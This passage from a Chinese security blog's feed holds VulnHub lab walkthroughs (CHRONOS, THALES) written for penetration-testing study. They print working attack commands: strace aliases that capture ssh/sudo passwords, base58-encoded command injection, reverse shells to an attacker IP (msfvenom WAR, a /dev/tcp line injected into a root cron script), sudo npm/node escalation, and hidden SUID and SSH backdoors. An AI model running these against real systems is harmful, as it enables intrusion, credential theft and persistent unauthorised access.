~/.bashrc &lt;&lt; EOF</span><br><span class=\"line\">alias ssh=&#x27;strace -f -e trace=read,write -o /tmp/.ssh-`date +%d%h%m%s`.log -s 32 ssh&#x27;</span><br><span class=\"line\">alias sudo=&#x27;strace -f -e trace=read,write -o /tmp/.sudo-`date &#x27;+%d%h%m%s&#x27;`.log -s 32</span><br><span class=\"line\">sudo&#x27;</span><br><span class=\"line\">alias su=&#x27;strace -f -e trace=read,write -o /tmp/.su-`date &#x27;+%d%h%m%s&#x27;`.log -s 32 su&#x27;</span><br><span class=\"line\">EOF</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">运行环境变量</span></span><br><span class=\"line\">source ~/.bashrc</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-305.png\" alt></p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">监听/tmp文件下新增的.ssh文件</span></span><br><span class=\"line\">watch -n1 ls -Alh /tmp</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">找出此阶段内登陆到此服务器的密码的记录,无论正确与否都会被监听</span></span><br><span class=\"line\">cat /tmp/.ssh-09May051652090355.log</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-306.png\" alt></p>\n<p>-&gt; strace 后门监控键盘有失败的时候，原因未知</p>\n",
            "tags": [
                "VULNHUB 11-20"
            ]
        },
        {
            "id": "https://n1h1l157.github.io/2021/11/01/VULNHUB/113%20CHRONOS/",
            "url": "https://n1h1l157.github.io/2021/11/01/VULNHUB/113%20CHRONOS/",
            "title": "VULNHUB 13 CHRONOS",
            "date_published": "2021-10-31T16:00:00.000Z",
            "content_html": "<p>靶机下载地址：<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cudnVsbmh1Yi5jb20vZW50cnkvY2hyb25vcy0xLDczNS8=\">https://www.vulnhub.com/entry/chronos-1,735/</span><br>\n 教程链接地址: <span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vc2FpbmV0L3AvMTU4MDExNDQuaHRtbA==\">https://www.cnblogs.com/sainet/p/15801144.html</span></p>\n<h3 id=\"确认攻击目标\"><a class=\"markdownIt-Anchor\" href=\"#确认攻击目标\">#</a> 确认攻击目标</h3>\n<p>攻击机 KALI： 192.168.31.135<br>\n 靶机 CHRONOS：桥接于 192.168.31.1 的网卡，ip 未知</p>\n<p>1）arp 确定靶机地址<br>\n <code>sudo arp-scan -l</code></p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-263.png\" alt></p>\n<p>-&gt; 目标机器的 ip 地址： 192.168.31.238</p>\n<ol start=\"2\">\n<li>确认靶机 ip 开放的端口信息<br>\n <code>sudo nmap -A -p- 192.168.31.238 -oN /tmp/chronos.txt</code></li>\n</ol>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-264.png\" alt></p>\n<p>-&gt; 靶机开放端口 21, 80, 8080</p>\n<h3 id=\"js-代码美化\"><a class=\"markdownIt-Anchor\" href=\"#js-代码美化\">#</a> js 代码美化</h3>\n<p>打开 <span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMzEuMjM4Lw==\">http://192.168.31.238/</span> 收集信息</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-265.png\" alt></p>\n<p>审查源代码，发现一串敏感代码</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-266.png\" alt></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9nY2hxLmdpdGh1Yi5pby9DeWJlckNoZWYv\">https://gchq.github.io/CyberChef/</span> 上进行 js 代码美化</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-267.png\" alt></p>\n<p>复制代码，并且写到 kali 上，开启简易 web，在网站上浏览详细内容</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-268.png\" alt></p>\n<p>看到了一个可疑的 url 地址：<span class=\"exturl\" data-url=\"aHR0cDovL2Nocm9ub3MubG9jYWw6ODAwMC9kYXRlP2Zvcm1hdD00dWdZRHVBa1NjQ0c1Z01jWmpFTjNtQUx5RzFkRDVaWXNpQ2ZXdlEydzlhbllHeUw=\">http://chronos.local:8000/date?format=4ugYDuAkScCG5gMcZjEN3mALyG1dD5ZYsiCfWvQ2w9anYGyL</span></p>\n<p>-&gt; 可疑密文：4ugYDuAkScCG5gMcZjEN3mALyG1dD5ZYsiCfWvQ2w9anYGyL</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-269.png\" alt></p>\n<h3 id=\"base58-解密\"><a class=\"markdownIt-Anchor\" href=\"#base58-解密\">#</a> base58 解密</h3>\n<p>修改本地 hosts，访问此网站</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-270.png\" alt></p>\n<p>将可疑密文在 <span class=\"exturl\" data-url=\"aHR0cHM6Ly9nY2hxLmdpdGh1Yi5pby9DeWJlckNoZWYv\">https://gchq.github.io/CyberChef/</span> 上进行解密，发现是 base58 加密<br>\n <code>'+Today is %A, %B %d, %Y %H:%M:%S.'</code> <br>\n 即意味着服务上执行了 date ‘+Today is % A, % B % d, % Y % H:% M:% S.’<br>\n想办法构造 payload 拼接此代码并进行加密</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-271.png\" alt></p>\n<p>date ‘+Today is %A, %B %d, %Y %H:%M:%S.’|ls<br>\n 并且在 cyberchef 上进行 base58 加密</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-272.png\" alt></p>\n<p>得到密文：6o4pVfNt5u68hvKNrAyNuyr7at25Ddm18CEZm8JmX2GYysMb7Wdg</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-273.png\" alt></p>\n<p>访问 url 地址：<span class=\"exturl\" data-url=\"aHR0cDovL2Nocm9ub3MubG9jYWw6ODAwMC9kYXRlP2Zvcm1hdD02bzRwVmZOdDV1NjhodktOckF5TnV5cjdhdDI1RGRtMThDRVptOEptWDJHWXlzTWI3V2Rn\">http://chronos.local:8000/date?format=6o4pVfNt5u68hvKNrAyNuyr7at25Ddm18CEZm8JmX2GYysMb7Wdg</span></p>\n<p>访问网址后并没有很明显的效果返回，利用 burp 做中间代理，拦截浏览器的数据，查看返回数据包，返回的是权限不足</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-274.png\" alt></p>\n<p>修改 UA 头，将其改为网站 header 指向的 Chronos 重发数据包，返回数据成功</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-275.png\" alt></p>\n<h3 id=\"拼接linux命令反弹\"><a class=\"markdownIt-Anchor\" href=\"#拼接linux命令反弹\">#</a> 拼接 linux 命令反弹</h3>\n<p>在 CyberChef 上获取到反弹 shell 的 base58 加密的字符<br>\n U6YeY5FABfZU5dWU4iyrYh9ftggJULF7AzvEmsEnqUSdUnWKwDwYAdF6xprK9ZaUTnNV4HebvA5KUFR4p8U1GPYuZzx927U1oUJ4sCBU3eETEhVAMyAEe55PUwNR</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-276.png\" alt></p>\n<p>拼接到 url 地址中，并且监听本地的 4445 端口，等待 shell<br>\n 等同于访问 http://chronos.local:8000/date?format=U6YeY5FABfZU5dWU4iyrYh9ftggJULF7AzvEmsEnqUSdUnWKwDwYAdF6xprK9ZaUTnNV4HebvA5KUFR4p8U1GPYuZzx927U1oUJ4sCBU3eETEhVAMyAEe55PuwNR<br>\n 并修改 UA 为 Chronos</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-277.png\" alt></p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">接收到shell之后，使用python3 改为一个标准的终端</span></span><br><span class=\"line\">python3 -c &quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span><br><span class=\"line\">stty raw -echo;fg</span><br><span class=\"line\">export TERM=xterm</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-278.png\" alt></p>\n<h3 id=\"服务器信息收集\"><a class=\"markdownIt-Anchor\" href=\"#服务器信息收集\">#</a> 服务器信息收集</h3>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">收集服务器的相关信息</span></span><br><span class=\"line\">sudo - l</span><br><span class=\"line\">cat /etc/issue</span><br><span class=\"line\">uname -a</span><br><span class=\"line\">make</span><br><span class=\"line\">ls -Alh `which pkexec`</span><br><span class=\"line\">find / -perm -u=s -type f 2&gt;/dev/null</span><br><span class=\"line\">id</span><br><span class=\"line\">ls /opt &amp;&amp; ls /var &amp;&amp; ls /home</span><br></pre></td></tr></table></figure>\n<p>发现服务器上无权限设置的错误，也不能利用 pkexec<br>\n 进行提权，id 组也没有设置错误，没有 suid 的错误权限可利用文件</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-279.png\" alt></p>\n<h3 id=\"express-fileupload提权\"><a class=\"markdownIt-Anchor\" href=\"#express-fileupload提权\">#</a> express-fileupload 提权</h3>\n<p>继续翻阅文件，查找的一个 chronos-v2 的文件夹，找到 server.js 中有 express-fileupload 的调用</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-280.png\" alt></p>\n<p>直接用谷歌搜索是否存在此组件的漏洞，果然找到了一个 exp</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-281.png\" alt></p>\n<p>在 github 上找到了 ejs 利用的代码，复制此 payload</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-282.png\" alt></p>\n<p>将 payload 中的参数进行修改，反弹主机 ip 和端口，以及 ejs 的端口号<br>\n<img data-src=\"/N1h1l157/VULNHUB/image-283.png\" alt></p>\n<p>开启简易 web 服务，将此文件下载到目标靶机上</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-284.png\" alt></p>\n<p>目标靶机通过运行 ejs.py 文件，shell 成功被反弹</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">使用python，<span class=\"built_in\">stty</span>得到一个标准的shell</span></span><br><span class=\"line\">python3 -c &quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span><br><span class=\"line\">stty raw -echo;fg</span><br><span class=\"line\">export TERM=xterm</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-285.png\" alt></p>\n<h3 id=\"sudonpmnode提权\"><a class=\"markdownIt-Anchor\" href=\"#sudonpmnode提权\">#</a> sudo (npm/node) 提权</h3>\n<p>查看相关权限的设置，发现 npm，node 都可以提权<br>\n在 https://gtfobins.github.io/ 上找到提权命令进行提权</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">npm 提权</span></span><br><span class=\"line\">sudo npm exec /bin/bash</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">node 提权</span></span><br><span class=\"line\">sudo node -e &#x27;child_process.spawn(&quot;/bin/sh&quot;, &#123;stdio: [0, 1, 2]&#125;)&#x27;</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-286.png\" alt></p>\n<p>-&gt; 获取到了 root 权限</p>\n<h3 id=\"ssh-pam-软链接维权\"><a class=\"markdownIt-Anchor\" href=\"#ssh-pam-软链接维权\">#</a> SSH PAM 软链接维权</h3>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\">#</span><span class=\"language-bash\"><span class=\"comment\">## 靶机上执行：</span></span></span><br><span class=\"line\">ln -sf /usr/sbin/sshd /tmp/su;/tmp/su -oport=12345</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">检查端口号看是否命令是否执行成功：</span></span><br><span class=\"line\">ps aux | grep 12345</span><br><span class=\"line\">netstat -tanlp | grep 12345</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-287.png\" alt></p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\">#</span><span class=\"language-bash\"><span class=\"comment\">## 攻击机执行：</span></span></span><br><span class=\"line\">ssh root@192.168.31.238 -p 12345</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">接着输入任意密码就可以root用户权限登陆了</span></span><br></pre></td></tr></table></figure>\n<p>实际测试中发现，如果 root 用户被禁止登陆时此方式不能直接登陆，但是可以利用其他存在的用户身份登陆，如：<br>\nssh <span class=\"exturl\" data-url=\"bWFpbHRvOmltZXJhQDE5Mi4xNjguMzEuMjM4\">imera@192.168.31.238</span> -p 12345 接着输入任意密码就可以 imera 用户权限登陆了</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">在ssh的配置文件中开启root登陆，是否可以解决无法用root登陆的问题</span></span><br><span class=\"line\">cat /etc/ssh/sshd_config | grep PermitRootLogin</span><br><span class=\"line\">vim /etc/ssh/sshd_config</span><br><span class=\"line\">service ssh restart</span><br><span class=\"line\">ssh root@192.168.31.238 -p 12345</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-288.png\" alt></p>\n<p>-&gt; 并不能直接登陆到 root 账户，需要其他的设置进入 root 账户</p>\n<h3 id=\"suid-权限维持\"><a class=\"markdownIt-Anchor\" href=\"#suid-权限维持\">#</a> SUID 权限维持</h3>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">制作隐藏的SUID文件</span></span><br><span class=\"line\">cp /bin/bash /var/.hack</span><br><span class=\"line\">chmod 4755 /var/.hack</span><br><span class=\"line\">ls -Alh /var/.hack</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-289.png\" alt></p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">连接靶机并用SUID文件提权至root</span></span><br><span class=\"line\">ssh imera@192.168.31.238 -p 12345</span><br><span class=\"line\">/var/.hack -p &amp; whoami</span><br></pre></td></tr></table></figure>\n<p>-&gt; 维持到了 root，现用 imera 登陆，再用 /var/.hack 提权</p>\n",
            "tags": [
                "VULNHUB 11-20"
            ]
        },
        {
            "id": "https://n1h1l157.github.io/2021/11/01/VULNHUB/115%20THALES/",
            "url": "https://n1h1l157.github.io/2021/11/01/VULNHUB/115%20THALES/",
            "title": "VULNHUB 15 THALES",
            "date_published": "2021-10-31T16:00:00.000Z",
            "content_html": "<p>靶机下载地址：<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cudnVsbmh1Yi5jb20vZW50cnkvdGhhbGVzLTEsNzQ5Lw==\">https://www.vulnhub.com/entry/thales-1,749/</span><br>\n 教程链接地址: <span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80Mzc4NDA1Ni9hcnRpY2xlL2RldGFpbHMvMTIzNTc3ODYy\">https://blog.csdn.net/weixin_43784056/article/details/123577862</span></p>\n<h3 id=\"确认攻击目标\"><a class=\"markdownIt-Anchor\" href=\"#确认攻击目标\">#</a> 确认攻击目标</h3>\n<p>攻击机 KALI： 192.168.31.135<br>\n 靶机 THALES：桥接于 192.168.31.1 的网卡，ip 未知</p>\n<p>1）arp 确定靶机地址<br>\n <code>sudo arp-scan -l</code></p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-307.png\" alt></p>\n<p>-&gt; 目标机器的 ip 地址： 192.168.31.109</p>\n<ol start=\"2\">\n<li>确认靶机 ip 开放的端口信息<br>\n <code>sudo nmap -A -p- 192.168.31.109</code></li>\n</ol>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-308.png\" alt></p>\n<p>-&gt; 靶机开放端口 22, 8080</p>\n<h3 id=\"网站信息收集\"><a class=\"markdownIt-Anchor\" href=\"#网站信息收集\">#</a> 网站信息收集</h3>\n<p>打开 [<span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMzEuMTA5\">http://192.168.31.109</span>](<span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMzEuMTA5\">http://192.168.31.109</span> 进行信息收集</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-309.png\" alt></p>\n<p>页面是一个普通的 tomcat 首页，没有直接可以点击的接口</p>\n<p>扫描目录  <code>dirsearch -u http://192.168.31.109:8080/</code></p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-310.png\" alt></p>\n<p>-&gt; 对识别到的目录依次进行访问，找到了两个敏感目录</p>\n<p><span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMzEuMTA5L21hbmFnZXIvaHRtbA==\">http://192.168.31.109/manager/html</span><br>\n<span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMzEuMTA5L3NoZWxsLw==\">http://192.168.31.109/shell/</span></p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">换一个字典，重新扫描看是否有没有被找到的目录</span></span><br><span class=\"line\">gobuster dir -u http://192.168.31.109:8080 -x php,txt,html,zip,rar -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-311.png\" alt></p>\n<p><span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMzEuMTA5L3NoZWxsLw==\">http://192.168.31.109/shell/</span><br>\n 是一个不停转圈的网站，猜测是作者遗留在此的一个后门文件</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-312.png\" alt></p>\n<p><span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMzEuMTA5L21hbmFnZXIvaHRtbA==\">http://192.168.31.109/manager/html</span> 登陆界面，可进行爆破</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-313.png\" alt></p>\n<h3 id=\"tomcat-弱口令爆破\"><a class=\"markdownIt-Anchor\" href=\"#tomcat-弱口令爆破\">#</a> tomcat 弱口令爆破</h3>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">使用msf对此登陆框进行弱口令尝试</span></span><br><span class=\"line\">use auxiliary/scanner/http/tomcat_mgr_login</span><br><span class=\"line\">set RHOSTS 192.168.31.109</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-314.png\" alt></p>\n<p>较长时间后，获取到了正确的 tomcat 密码<br>\n<img data-src=\"/N1h1l157/VULNHUB/image-315.png\" alt></p>\n<p>-&gt; 用户名：tomcat 密码：role1</p>\n<p><span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMzEuMTA5OjgwODAvbWFuYWdlci9odG1s\">http://192.168.31.109:8080/manager/html</span> 存在一个文件上传的漏洞，可用来上传 war 后门文件</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-316.png\" alt></p>\n<h3 id=\"war-后门文件上传\"><a class=\"markdownIt-Anchor\" href=\"#war-后门文件上传\">#</a> War 后门文件上传</h3>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">使用msf生成一个反弹shell的war文件木马</span></span><br><span class=\"line\">msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.31.135 LPORT=4444 -f</span><br><span class=\"line\">war -o revshell.war</span><br></pre></td></tr></table></figure>\n<p>同时监听 4444 端口，等待 shell 的反弹</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-317.png\" alt></p>\n<p>将 war 文件上传到 tomcat 上</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-318.png\" alt></p>\n<p>在网站上已经显示出了具体的 url 地址</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-319.png\" alt></p>\n<p>点击此文件执行此反弹 shell 的代码</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-320.png\" alt></p>\n<p>-&gt; 拿到了服务器上的网站的权限</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-321.png\" alt></p>\n<h3 id=\"服务器信息收集\"><a class=\"markdownIt-Anchor\" href=\"#服务器信息收集\">#</a> 服务器信息收集</h3>\n<p>查看 sudo -l 相关权限设置，查看是否有 s 权限设置错误<br>\n<img data-src=\"/N1h1l157/VULNHUB/image-322.png\" alt></p>\n<p>查看是否可以通过 pkexec 提权<br>\n<img data-src=\"/N1h1l157/VULNHUB/image-323.png\" alt></p>\n<p>翻阅目录，查找敏感文件<br>\n<img data-src=\"/N1h1l157/VULNHUB/image-324.png\" alt></p>\n<p><span class=\"exturl\" data-url=\"aHR0cDovL3huLS1ub3Rlcy12YjhqNjB6LnhuLS10eHRiYWNrdXAteDc1bm9vMjJmY2ExaDMwNHFkYzBiZ2RnZ2EzNDRlZTk1aC5zaA==\">根据 notes.txt 文件提示有一个备份文件 backup.sh</span>，查看文件权限，发现所有者和组都是 root，所以应该是以 root 的身份在后台运行</p>\n<p>-&gt; 可以使用 pspy64 脚本查看一下</p>\n<h3 id=\"pspy64-监控\"><a class=\"markdownIt-Anchor\" href=\"#pspy64-监控\">#</a> pspy64 监控</h3>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">wget https://github.com/DominicBreuker/pspy/archive/refs/heads/master.zip</span><br><span class=\"line\">python -m http.server 80</span><br><span class=\"line\">wget 192.168.31.135/pspy64s</span><br><span class=\"line\">./pspy64s</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-325.png\" alt></p>\n<p>通过 pspy 监视正在运行的进程，发现有 UID=0 执行的程序，<span class=\"exturl\" data-url=\"aHR0cDovL2JhY2t1cC5zaA==\">backup.sh</span></p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-326.png\" alt></p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\">#</span><span class=\"language-bash\">可以将反弹root终端的代码插入到backup.sh中，监听相应端口</span></span><br><span class=\"line\">bash -c &#x27;bash -i &gt;&amp; /dev/tcp/192.168.31.135/4444 0&gt;&amp;1&#x27;</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">查看文件的最后两行</span></span><br><span class=\"line\">tail -n 2 /usr/local/bin/backup.sh</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-327.png\" alt></p>\n<p>等待 shell 被反弹<br>\n<img data-src=\"/N1h1l157/VULNHUB/image-328.png\" alt></p>\n<p>-&gt; 成功拿到 root 权限</p>\n<p>查看一下计划任务</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">查看定时任务</span></span><br><span class=\"line\">crontab -l </span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">发现是 5 分钟备份一次</span></span><br><span class=\"line\">*/5 * * * * bash /usr/local/bin/backup.sh</span><br></pre></td></tr></table></figure>\n<h3 id=\"suid-权限维持\"><a class=\"markdownIt-Anchor\" href=\"#suid-权限维持\">#</a> SUID 权限维持</h3>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">新增用户</span></span><br><span class=\"line\">useradd kali &amp;&amp; passwd kali</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">新增SUID文件</span></span><br><span class=\"line\">cp /bin/bash /var/.hack &amp;&amp; chmod 4755 /var/.hack</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">chattr锁定文件</span></span><br><span class=\"line\">ls -Alh /var/.hack &amp;&amp; chattr +i /var/.hack &amp;&amp; rm -f /var/.hack</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-329.png\" alt></p>\n<p>检验是否权限维持成功<br>\n<img data-src=\"/N1h1l157/VULNHUB/image-330.png\" alt></p>\n<h3 id=\"chattr-锁定文件权限\"><a class=\"markdownIt-Anchor\" href=\"#chattr-锁定文件权限\">#</a> chattr 锁定文件权限</h3>\n<p>在 Linux 中，使用 chattr 命令来防止 root 和其他管理用户误删除和修改重要文件及目录，此权限用 ls -l 是查看不出来的，从而达到隐藏权限的目的。</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">锁定文件</span> </span><br><span class=\"line\">chattr +i evil.php </span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">属性查看</span></span><br><span class=\"line\">lsattr evil.php</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">解除锁定</span></span><br><span class=\"line\">chattr -i evil.php </span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">删除文件</span></span><br><span class=\"line\">rm -rf 1.evil.php</span><br></pre></td></tr></table></figure>\n<p>chattr 锁定权限，通过解锁才能删除</p>\n",
            "tags": [
                "VULNHUB 11-20"
            ]
        },
        {
            "id": "https://n1h1l157.github.io/2021/11/01/VULNHUB/117%20WEBMACHINE/",
            "url": "https://n1h1l157.github.io/2021/11/01/VULNHUB/117%20WEBMACHINE/",
            "title": "VULNHUB 17 WEBMACHINE",
